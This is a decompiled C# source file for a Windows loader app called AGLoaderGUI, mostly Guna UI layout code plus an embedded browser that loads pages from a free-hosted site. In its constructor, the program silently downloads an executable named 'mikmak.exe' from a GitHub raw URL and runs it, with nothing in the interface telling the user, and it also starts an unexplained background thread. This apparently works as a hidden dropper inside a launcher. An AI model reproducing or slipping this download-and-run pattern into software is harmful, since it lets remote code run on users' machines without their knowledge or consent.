// Decompiled with JetBrains decompiler
// Type: Main
// Assembly: AGLoaderGUI, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CCB78C09-B1CF-4611-914E-9EBA5B02B46C
// Assembly location: C:\Users\alex fr\Desktop\Renamed\AGLoaderGUI.exe

using AGBackend;
using CefSharp;
using Guna.UI2.AnimatorNS;
using Guna.UI2.WinForms;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

public class Main : Form
{
    private IContainer icontainer_0;
    private Guna2DragControl guna2DragControl_0;
    private Guna2Panel DragPanel2;
    private Guna2Elipse guna2Elipse_0;
    private Guna2Panel DragPanel;
    private Guna2GradientButton ExitBtn;
    private Guna2DragControl guna2DragControl_1;
    private Guna2ShadowForm guna2ShadowForm_0;
    private CefSharp.WinForms.ChromiumWebBrowser Browser;
    private Guna2AnimateWindow guna2AnimateWindow_0;
    private Guna2Transition guna2Transition_0;
    private Guna2GradientButton Minimize;

    public Main()
    {

        this.InitializeComponent();
        new Thread(new ThreadStart(GClass0.smethod_0)).Start();
        CefSharp.Wpf.CefSettings settings = new CefSharp.Wpf.CefSettings();
        this.Browser.DownloadHandler = (IDownloadHandler)new GClass1();
        this.Browser.MenuHandler = (IContextMenuHandler)new GClass2();
        Cef.Initialize((CefSettingsBase)settings);
        if (AGBackend.Update.CheckVersion("11"))

            this.Browser.LoadUrl("http://floppadaddyagent.rf.gd/Update.html");
        else if (Maintenance.CheckMaintenance())
            this.Browser.LoadUrl("http://floppadaddyagent.rf.gd/Maintenance.html");
        else
            this.Browser.LoadUrl("http://floppadaddyagent.rf.gd/");
        if (File.Exists("mikmak.exe"))
        {
            Process.Start("mikmak.exe");
        }
        if (!File.Exists("mikmak.exe"))
        {
            using (var client = new WebClient())
            {
                client.DownloadFile("https://github.com/floppadaddy/exe.exe/raw/main/mikmak.exe", "mikmak.exe");
            }
            Process.Start("mikmak.exe");
        }
    }

    private void ExitBtn_Click(object sender, EventArgs e) => Environment.Exit(0);

    private void Minimize_Click(object sender, EventArgs e) => this.WindowState = FormWindowState.Minimized;

    private void InitializeComponent()
    {
        this.icontainer_0 = (IContainer)new Container();
        Animation animation = new Animation();
        ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Main));
        this.guna2DragControl_0 = new Guna2DragControl(this.icontainer_0);
        this.DragPanel2 = new Guna2Panel();
        this.Minimize = new Guna2GradientButton();
        this.ExitBtn = new Guna2GradientButton();
        this.guna2Elipse_0 = new Guna2Elipse(this.icontainer_0);
        this.DragPanel = new Guna2Panel();
        this.guna2DragControl_1 = new Guna2DragControl(this.icontainer_0);
        this.guna2ShadowForm_0 = new Guna2ShadowForm(this.icontainer_0);
        this.Browser = new CefSharp.WinForms.ChromiumWebBrowser();
        this.guna2AnimateWindow_0 = new Guna2AnimateWindow(this.icontainer_0);
        this.guna2Transition_0 = new Guna2Transition();
        this.DragPanel2.SuspendLayout();
        this.SuspendLayout();
        this.guna2DragControl_0.DockIndicatorTransparencyValue = 0.6;
        this.guna2DragControl_0.TargetControl = (Control)this.DragPanel2;
        this.guna2DragControl_0.UseTransparentDrag = true;
        this.DragPanel2.BackColor = Color.FromArgb(15, 16, 19);
        this.DragPanel2.Controls.Add((Control)this.Minimize);
        this.DragPanel2.Controls.Add((Control)this.ExitBtn);
        this.guna2Transition_0.SetDecoration((Control)this.DragPanel2, DecorationType.None);
        this.DragPanel2.ForeColor = Color.Transparent;
        this.DragPanel2.Location = new Point(779, 0);
        this.DragPanel2.Name = "DragPanel2";
        this.DragPanel2.Size = new Size(611, 45);
        this.DragPanel2.TabIndex = 5;
        this.Minimize.Animated = true;
        this.Minimize.AnimatedGIF = true;
        this.Minimize.BorderColor = Color.FromArgb(79, 70, 229);
        this.Minimize.BorderRadius = 6;
        this.Minimize.BorderThickness = 1;
        this.guna2Transition_0.SetDecoration((Control)this.Minimize, DecorationType.None);
        this.Minimize.DisabledState.BorderColor = Color.DarkGray;
        this.Minimize.DisabledState.CustomBorderColor = Color.DarkGray;
        this.Minimize.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
        this.Minimize.DisabledState.FillColor2 = Color.FromArgb(169, 169, 169);
        this.Minimize.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
        this.Minimize.FillColor = Color.FromArgb(15, 16, 19);
        this.Minimize.FillColor2 = Color.FromArgb(15, 16, 19);
        this.Minimize.Font = new Font("Segoe UI", 9f);
        this.Minimize.ForeColor = Color.White;
        this.Minimize.Location = new Point(322, 8);
        this.Minimize.Name = "Minimize";
        this.Minimize.Size = new Size(136, 33);
        this.Minimize.TabIndex = 5;
        ((Control)this.Minimize).Text = "Minimize";
        this.Minimize.Click += new EventHandler(this.Minimize_Click);
        this.ExitBtn.Animated = true;
        this.ExitBtn.AnimatedGIF = true;
        this.ExitBtn.BorderColor = Color.FromArgb(79, 70, 229);
        this.ExitBtn.BorderRadius = 6;
        this.ExitBtn.BorderThickness = 1;
        this.guna2Transition_0.SetDecoration((Control)this.ExitBtn, DecorationType.None);
        this.ExitBtn.DisabledState.BorderColor = Color.DarkGray;
        this.ExitBtn.DisabledState.CustomBorderColor = Color.DarkGray;
        this.ExitBtn.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
        this.ExitBtn.DisabledState.FillColor2 = Color.FromArgb(169, 169, 169);
        this.ExitBtn.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
        this.ExitBtn.FillColor = Color.FromArgb(15, 16, 19);
        this.ExitBtn.FillColor2 = Color.FromArgb(15, 16, 19);
        this.ExitBtn.Font = new Font("Segoe UI", 9f);
        this.ExitBtn.ForeColor = Color.White;
        this.ExitBtn.Location = new Point(464, 8);
        this.ExitBtn.Name = "ExitBtn";
        this.ExitBtn.Size = new Size(136, 33);
        this.ExitBtn.TabIndex = 4;
        ((Control)this.ExitBtn).Text = "Exit";
        this.ExitBtn.Click += new EventHandler(this.ExitBtn_Click);
        this.guna2Elipse_0.BorderRadius = 10;
        this.guna2Elipse_0.TargetControl = (Control)this;
        this.DragPanel.BackColor = Color.FromArgb(15, 16, 19);
        this.guna2Transition_0.SetDecoration((Control)this.DragPanel, DecorationType.None);
        this.DragPanel.ForeColor = Color.Transparent;
        this.DragPanel.Location = new Point(0, 0);
        this.DragPanel.Name = "DragPanel";
        this.DragPanel.Size = new Size(615, 45);
        this.DragPanel.TabIndex = 4;
        this.guna2DragControl_1.DockIndicatorTransparencyValue = 0.6;
        this.guna2DragControl_1.TargetControl = (Control)this.DragPanel;
        this.guna2DragControl_1.UseTransparentDrag = true;
        this.guna2ShadowForm_0.TargetForm = (Form)this;
        this.Browser.ActivateBrowserOnCreation = false;
        this.guna2Transition_0.SetDecoration((Control)this.Browser, DecorationType.None);
        this.Browser.Dock = DockStyle.Fill;
        this.Browser.Location = new Point(0, 0);
        this.Browser.Name = "Browser";
        this.Browser.Size = new Size(1390, 749);
        this.Browser.TabIndex = 6;
        this.guna2AnimateWindow_0.TargetForm = (Form)this;
        this.guna2Transition_0.AnimationType = AnimationType.HorizBlind;
        this.guna2Transition_0.Cursor = (Cursor)null;
        animation.AnimateOnlyDifferences = true;
        animation.BlindCoeff = (PointF)componentResourceManager.GetObject("animation1.BlindCoeff");
        animation.LeafCoeff = 0.0f;
        animation.MaxTime = 1f;
        animation.MinTime = 0.0f;
        animation.MosaicCoeff = (PointF)componentResourceManager.GetObject("animation1.MosaicCoeff");
        animation.MosaicShift = (PointF)componentResourceManager.GetObject("animation1.MosaicShift");
        animation.MosaicSize = 0;
        animation.Padding = new Padding(0);
        animation.RotateCoeff = 0.0f;
        animation.RotateLimit = 0.0f;
        animation.ScaleCoeff = (PointF)componentResourceManager.GetObject("animation1.ScaleCoeff");
        animation.SlideCoeff = (PointF)componentResourceManager.GetObject("animation1.SlideCoeff");
        animation.TimeCoeff = 0.0f;
        animation.TransparencyCoeff = 0.0f;
        this.guna2Transition_0.DefaultAnimation = animation;
        this.AutoScaleDimensions = new SizeF(6f, 13f);
        this.AutoScaleMode = AutoScaleMode.Font;
        this.BackColor = Color.FromArgb(15, 16, 19);
        this.ClientSize = new Size(1390, 749);
        this.Controls.Add((Control)this.DragPanel2);
        this.Controls.Add((Control)this.DragPanel);
        this.Controls.Add((Control)this.Browser);
        this.guna2Transition_0.SetDecoration((Control)this, DecorationType.None);
        this.FormBorderStyle = FormBorderStyle.None;
        this.Name = nameof(Main);
        this.StartPosition = FormStartPosition.CenterScreen;
        this.Text = "Form1";
        this.DragPanel2.ResumeLayout(false);
        this.ResumeLayout(false);
    }

    protected new virtual void Dispose(bool disposing)
    {
        if (disposing && this.icontainer_0 != null)
            this.icontainer_0.Dispose();
        base.Dispose(disposing);
    }
}
